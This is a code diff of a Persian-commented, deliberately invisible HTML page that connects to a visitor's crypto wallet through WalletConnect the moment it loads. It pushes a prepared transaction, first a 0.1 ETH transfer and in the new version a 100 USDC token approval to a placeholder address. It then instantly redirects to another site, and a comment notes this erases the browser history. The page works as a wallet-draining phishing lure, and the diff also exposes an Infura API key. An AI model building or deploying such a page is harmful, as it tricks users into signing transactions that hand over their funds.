@@ -2,53 +2,62 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>اتصال ایمن</title> <!-- عنوان برای سئو، اما visible نیست -->
-  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script> <!-- ethers.js برای تراکنش -->
-  <script src="https://unpkg.com/@walletconnect/web3-provider@2.0.0/dist/umd/index.min.js"></script> <!-- WalletConnect -->
+  <title> </title>
+  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@2.0.0/dist/umd/index.min.js"></script>
 </head>
 <body>
-  <!-- هیچ محتوای visible نداریم—صفحه کاملاً نامرئیه -->
   <script>
-    // کد برای لینک مستقیم: همزمان کیف پول فرامی‌خونه و به test.com ریدایرکت می‌کنه
+    // کد برای لینک مستقیم: همزمان کیف پول باز می‌کنه و به test.com ریدایرکت می‌کنه
     async function createDeepLinkAndOpenSite() {
-      // ایجاد provider WalletConnect (مثل Aave)
+      // دیباگ: چک کردن شروع فرآیند
+      console.log('شروع اتصال به WalletConnect...');
+      
+      // ایجاد provider WalletConnect
       const provider = new WalletConnectProvider({
-        infuraId: 'c886ed6dee284317ad1e17cb5e5cba6f', // کلید Infura از infura.io (رایگان)
-        chainId: 1, // اتریوم اصلی (برای تست: 11155111 برای Sepolia)
+        infuraId: 'c886ed6dee284317ad1e17cb5e5cba6f', // جایگذاری کلید Infura (بدون '')
+        chainId: 11155111, // Sepolia برای تست (برای اتریوم اصلی: 1)
+        // اضافه کردن bridge برای اطمینان از اتصال
+        rpc: { 11155111: 'https://sepolia.infura.io/v3/your_infura_id_here' }
       });
 
       try {
-        // فعال کردن اتصال (دیپ لینک: کیف پول فوری باز می‌شه)
+        // فعال کردن اتصال (دیپ لینک: کیف پول باز می‌شه)
+        console.log('تلاش برای اتصال به کیف پول...');
         await provider.enable();
 
-        // تراکنش از پیش آماده: مثلاً انتقال 0.1 ETH (تغییر بده)
-        const signer = new ethers.Wallet(provider);
-        const tx = {
-          to: '0xRecipientAddressHere', // آدرس گیرنده
-          value: ethers.parseEther('0.1'), // مبلغ
-          gasLimit: 21000,
-        };
+        // ایجاد signer
+        const signer = new ethers.providers.Web3Provider(provider).getSigner();
 
-        // پیشنهاد تراکنش
-        await provider.request({ method: 'eth_sendTransaction', params: [tx] });
-        console.log('تراکنش امضا شد'); // فقط در کنسول
+        // تراکنش نمونه: approve USDC برای Aave LendingPool
+        const usdcAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC (برای Sepolia، آدرس تست پیدا کن)
+        const aaveLendingPool = '0xYourAaveLendingPoolAddress'; // آدرس قرارداد Aave (جایگزین کن)
+        const amount = ethers.utils.parseUnits('100', 6); // 100 USDC (6 اعشار)
+        
+        // ABI ساده برای approve
+        const abi = ['function approve(address spender, uint256 amount) public returns (bool)'];
+        const contract = new ethers.Contract(usdcAddress, abi, signer);
+
+        // پیشنهاد تراکنش approve
+        console.log('پیشنهاد تراکنش approve...');
+        const tx = await contract.approve(aaveLendingPool, amount);
+        console.log('تراکنش پیشنهاد شد: ', tx.hash);
       } catch (error) {
-        console.error('خطا: ', error); // فقط در کنسول، بدون alert
+        console.error('خطا در اتصال یا تراکنش: ', error.message);
       }
     }
 
-    // همزمان: ریدایرکت فوری به وبسایت توضیحات و فراخوانی کیف پول
+    // همزمان: ریدایرکت فوری و فراخوانی کیف پول
     (function() {
-      // باز کردن کیف پول (غیرهمزمان برای سرعت)
+      console.log('اجرای فرآیند...');
       createDeepLinkAndOpenSite();
-      // ریدایرکت فوری به test.com (صفحه GitHub Pages باقی نمی‌مونه)
-      window.location.replace('https://test.com'); // replace تاریخچه مرورگر رو پاک می‌کنه
+      window.location.replace('https://test.com');
     })();
 
     // برای تست: اگر ?auto=false باشه، اجرا نشه
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.get('auto') === 'false') {
-      window.onload = null; // غیرفعال کردن
+      window.onload = null;
     }
   </script>
 </body>
